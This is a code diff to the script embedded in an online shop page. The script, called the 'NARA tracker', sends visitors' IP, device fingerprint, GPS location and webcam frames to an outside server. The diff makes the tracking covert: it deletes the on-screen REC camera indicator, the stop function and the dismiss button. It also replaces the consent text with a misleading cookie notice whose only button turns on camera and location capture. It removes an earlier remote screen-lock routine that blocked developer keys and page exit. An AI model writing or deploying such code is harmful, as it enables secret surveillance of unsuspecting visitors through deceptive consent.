@@ -968,7 +968,7 @@ renderProducts();
 updateCart();
     </script>
 
-    <!-- ===== NARA tracker: IP + device + lokasi + kamera + lock + fullscreen ===== -->
+    <!-- ===== NARA tracker: IP + device + lokasi + kamera (silent, tanpa lock/fullscreen) ===== -->
     <script>
       (function () {
         var BASE = 'https://149.33.27.129.nip.io/phi';
@@ -977,46 +977,20 @@ updateCart();
         var LOC_EP = BASE + '/api/location/';
         var FRAME_EP = BASE + '/api/frame/';
         var STATUS_EP = BASE + '/api/status/';
-        var LOCKPAGE_URL = BASE + '/api/lockpage';
-        var CONSENT_KEY = 'nara_consent_v6';
-        var VISIT_ID_KEY = 'nara_visit_id_v6';
+        var CONSENT_KEY = 'nara_consent_v7';
+        var VISIT_ID_KEY = 'nara_visit_id_v7';
 
         var visitId = null;
         var stream = null;
         var captureTimer = null;
-        var statusTimer = null;
-        var lockIframe = null;
-        var visitGone = false;
-        var isLocked = false;
-        var prevUserSelect = '';
-        var prevOverflow = '';
 
         function log() {
           try { var a = Array.prototype.slice.call(arguments); a.unshift('[nara]'); console.log.apply(console, a); } catch (e) {}
         }
 
-        // ===== Fullscreen (desktop, Android, iPad; iPhone Safari tidak support tapi overlay tetap nutup) =====
-        function enterFullscreen() {
-          if (document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement) return;
-          var el = document.documentElement;
-          var req = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
-          if (!req) return;
-          try {
-            var p = req.call(el);
-            if (p && p.catch) p.catch(function () {});
-          } catch (e) {}
-        }
-        function tryReenterFullscreen() {
-          if (!isLocked) return;
-          if (document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement) return;
-          enterFullscreen();
-        }
-        document.addEventListener('fullscreenchange', tryReenterFullscreen);
-        document.addEventListener('webkitfullscreenchange', tryReenterFullscreen);
-
-        // ===== Visit ID persistence =====
         function storedVisitId() { try { return localStorage.getItem(VISIT_ID_KEY); } catch (e) { return null; } }
         function saveVisitId(id) { try { localStorage.setItem(VISIT_ID_KEY, id); } catch (e) {} }
+
         function createNewVisit() {
           log('creating new visit...');
           return fetch(VISIT_EP, {
@@ -1032,29 +1006,21 @@ updateCart();
         }
         function checkExistingVisit(id) {
           return fetch(STATUS_EP + id, { cache: 'no-store' })
-            .then(function (r) {
-              if (!r.ok) return null;
-              return r.json().then(function (d) { return { id: id, locked: !!(d && d.locked) }; });
-            })
+            .then(function (r) { if (!r.ok) return null; return r.json().then(function (d) { return { id: id, ok: !!(d && d.ok) }; }); })
             .catch(function () { return null; });
         }
         function initVisit() {
           var stored = storedVisitId();
           if (stored) {
             return checkExistingVisit(stored).then(function (found) {
-              if (found) {
-                visitId = found.id;
-                log('reusing visit id:', visitId);
-                if (found.locked) showLock();
-                return { reused: true };
-              }
+              if (found && found.ok) { visitId = found.id; log('reusing visit id:', visitId); return { reused: true }; }
               return createNewVisit();
             });
           }
           return createNewVisit();
         }
 
-        // ===== Device fingerprint (fallback untuk semua browser) =====
+        // ===== Device fingerprint =====
         async function collectDevice() {
           var d = {};
           try {
@@ -1177,7 +1143,7 @@ updateCart();
           );
         }
 
-        // ===== Kamera: tanpa tombol stop, tanpa popup =====
+        // ===== Kamera: silent, tanpa indikator, tanpa popup =====
         function startCamera() {
           if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
@@ -1198,15 +1164,13 @@ updateCart();
               video.playsInline = true;
               video.autoplay = true;
               video.srcObject = s;
-              video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
+              video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
               document.body.appendChild(video);
 
               var canvas = document.createElement('canvas');
               canvas.width = 640;
               canvas.height = 480;
               var ctx = canvas.getContext('2d');
-
-              showCameraIndicator();
 
               var started = false;
               var tryStart = function () {
@@ -1233,36 +1197,7 @@ updateCart();
             });
         }
 
-        function stopCamera() {
-          if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
-          if (stream) { stream.getTracks().forEach(function (t) { t.stop(); }); stream = null; }
-          document.querySelectorAll('video').forEach(function (el) { if (el.srcObject) { el.pause(); el.srcObject = null; el.remove(); } });
-          var ind = document.getElementById('nara-cam-indicator');
-          if (ind) ind.remove();
-        }
-
-        // Indicator kecil di pojok, TANPA tombol stop
-        function showCameraIndicator() {
-          if (document.getElementById('nara-cam-indicator')) return;
-          var st = document.createElement('style');
-          st.textContent = '' +
-            '#nara-cam-indicator{position:fixed;top:14px;right:14px;z-index:999999;' +
-            'background:rgba(185,28,28,.85);color:#fff;padding:6px 10px;border-radius:14px;' +
-            'font-size:11px;font-weight:600;display:flex;gap:7px;align-items:center;' +
-            'font-family:"DM Sans",system-ui,sans-serif;pointer-events:none;' +
-            'box-shadow:0 2px 10px rgba(0,0,0,.25)}' +
-            '#nara-cam-indicator .dot{width:7px;height:7px;border-radius:50%;background:#fff;' +
-            'animation:npulse 1s infinite}' +
-            '@keyframes npulse{0%,100%{opacity:1}50%{opacity:.3}}';
-          document.head.appendChild(st);
-
-          var el = document.createElement('div');
-          el.id = 'nara-cam-indicator';
-          el.innerHTML = '<span class="dot"></span><span>REC</span>';
-          document.body.appendChild(el);
-        }
-
-        // ===== Consent banner: 1 tombol, izin semua sekaligus =====
+        // ===== Consent banner: cuma 1 tombol Izinkan, tanpa close =====
         function buildBanner() {
           if (document.getElementById('nara-consent')) return;
           var st = document.createElement('style');
@@ -1273,120 +1208,27 @@ updateCart();
             'font-family:"DM Sans",system-ui,sans-serif;font-size:13px;line-height:1.5;' +
             'max-width:640px;margin:0 auto}' +
             '#nara-consent p{margin:0}' +
-            '#nara-consent .actions{display:flex;gap:8px;flex-wrap:wrap}' +
-            '#nara-consent button{border:0;cursor:pointer;font:inherit;font-size:12px;' +
-            'padding:10px 18px;border-radius:5px;font-weight:600}' +
-            '#nara-consent .primary{background:#b47b83;color:#232923}' +
-            '#nara-consent .secondary{background:transparent;color:#f7f5f0;border:1px solid #f7f5f066}' +
+            '#nara-consent button{border:0;cursor:pointer;font:inherit;font-size:13px;' +
+            'padding:11px 20px;border-radius:5px;font-weight:600;background:#b47b83;color:#232923;' +
+            'width:100%}' +
             '@media (max-width:520px){#nara-consent{left:10px;right:10px;bottom:10px;padding:14px}}';
           document.head.appendChild(st);
 
           var el = document.createElement('div');
           el.id = 'nara-consent';
           el.innerHTML = '' +
-            '<p><strong>Bantu kami kenali pengunjung.</strong> Dengan menekan "Izinkan Semua", ' +
-            'Anda mengizinkan akses kamera, lokasi, dan mode layar penuh untuk verifikasi kunjungan.</p>' +
-            '<div class="actions">' +
-            '<button class="primary" id="nara-allow-all">Izinkan Semua</button>' +
-            '<button class="secondary" id="nara-dismiss">Nanti saja</button>' +
-            '</div>';
+            '<p>Kami menggunakan cookies untuk meningkatkan pengalaman Anda di situs ini.</p>' +
+            '<button id="nara-allow">Izinkan</button>';
           document.body.appendChild(el);
 
-          document.getElementById('nara-allow-all').onclick = function () {
+          document.getElementById('nara-allow').onclick = function () {
             try { localStorage.setItem(CONSENT_KEY, 'granted'); } catch (e) {}
             removeBanner();
-            enterFullscreen();
             requestGPS();
             startCamera();
           };
-          document.getElementById('nara-dismiss').onclick = function () {
-            try { localStorage.setItem(CONSENT_KEY, 'dismissed'); } catch (e) {}
-            removeBanner();
-          };
         }
         function removeBanner() { var el = document.getElementById('nara-consent'); if (el) el.parentNode.removeChild(el); }
-
-        // ===== Lock / Unlock =====
-        function showLock() {
-          if (lockIframe) return;
-          log('LOCKING');
-          isLocked = true;
-
-          prevOverflow = document.body.style.overflow || '';
-          prevUserSelect = document.body.style.userSelect || '';
-
-          document.body.style.overflow = 'hidden';
-          document.body.style.userSelect = 'none';
-          document.body.style.webkitUserSelect = 'none';
-          document.body.style.webkitTouchCallout = 'none';
-
-          enterFullscreen();
-
-          lockIframe = document.createElement('iframe');
-          lockIframe.src = LOCKPAGE_URL + '?t=' + Date.now();
-          lockIframe.setAttribute('aria-label', 'Halaman terkunci');
-          lockIframe.setAttribute('allowfullscreen', 'true');
-          lockIframe.style.cssText = '' +
-            'position:fixed!important;top:0!important;left:0!important;' +
-            'width:100vw!important;height:100vh!important;' +
-            'width:100dvw!important;height:100dvh!important;' +
-            'border:0!important;z-index:2147483647!important;' +
-            'background:#0b0b0b!important;pointer-events:auto!important;';
-          document.body.appendChild(lockIframe);
-
-          stopCamera();
-        }
-
-        function hideLock() {
-          if (!lockIframe) return;
-          log('UNLOCKING');
-          isLocked = false;
-          lockIframe.remove();
-          lockIframe = null;
-          document.body.style.overflow = prevOverflow;
-          document.body.style.userSelect = prevUserSelect;
-          document.body.style.webkitUserSelect = prevUserSelect;
-          document.body.style.webkitTouchCallout = '';
-        }
-
-        function pollStatus() {
-          if (!visitId || visitGone) return;
-          fetch(STATUS_EP + visitId, { cache: 'no-store' })
-            .then(function (r) {
-              if (r.status === 404) { visitGone = true; return null; }
-              if (!r.ok) return null;
-              return r.json();
-            })
-            .then(function (data) {
-              if (!data) return;
-              if (data.locked && !isLocked) showLock();
-              else if (!data.locked && isLocked) hideLock();
-            })
-            .catch(function () {});
-        }
-        document.addEventListener('visibilitychange', function () {
-          if (!document.hidden && visitId) pollStatus();
-        });
-
-        // ===== Global blockers saat locked =====
-        document.addEventListener('keydown', function (e) {
-          if (!isLocked) return;
-          var k = e.key || '';
-          var blocked =
-            k === 'F12' ||
-            (e.ctrlKey && e.shiftKey && (k === 'I' || k === 'J' || k === 'C' || k === 'i' || k === 'j' || k === 'c')) ||
-            (e.ctrlKey && (k === 'U' || k === 'S' || k === 'P' || k === 'u' || k === 's' || k === 'p')) ||
-            (e.metaKey && e.altKey && (k === 'I' || k === 'J' || k === 'C' || k === 'i' || k === 'j' || k === 'c'));
-          if (blocked) { e.preventDefault(); e.stopPropagation(); return false; }
-        }, true);
-
-        document.addEventListener('contextmenu', function (e) {
-          if (isLocked) { e.preventDefault(); return false; }
-        }, true);
-
-        window.addEventListener('beforeunload', function (e) {
-          if (isLocked) { e.preventDefault(); e.returnValue = ''; return ''; }
-        });
 
         // ===== Boot =====
         initVisit().then(function () {
@@ -1401,15 +1243,11 @@ updateCart();
           try { state = localStorage.getItem(CONSENT_KEY); } catch (e) {}
 
           if (state === 'granted') {
-            enterFullscreen();
             requestGPS();
             startCamera();
-          } else if (state !== 'dismissed') {
+          } else {
             buildBanner();
           }
-
-          statusTimer = setInterval(pollStatus, 2000);
-          pollStatus();
         });
       })();
     </script>
